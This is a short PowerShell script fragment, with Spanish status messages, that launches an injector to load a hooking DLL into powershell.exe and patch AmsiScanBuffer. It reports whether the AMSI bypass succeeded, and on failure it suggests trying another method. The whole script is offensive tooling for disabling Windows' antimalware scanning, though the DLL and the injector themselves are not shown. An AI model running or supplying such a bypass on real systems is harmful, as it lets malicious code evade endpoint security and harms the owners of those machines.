Write-Host
Write-Host "Hooking AmsiScanBuffer:"
try
{  
    .\SimpleInjector.exe powershell.exe .\AmsiHook.dll
    Write-Host
    Write-Host "---> AMSI bypass Conseguido!"-ForegroundColor Green -BackgroundColor DarkBlue
    Write-Host
    pause
    Clear-Host
}
catch
{
    Write-Host
    Write-Host "---> No ha funcionado, intente otro método" -ForegroundColor Red -BackgroundColor Yellow
    pause
    Clear-Host
}
break;
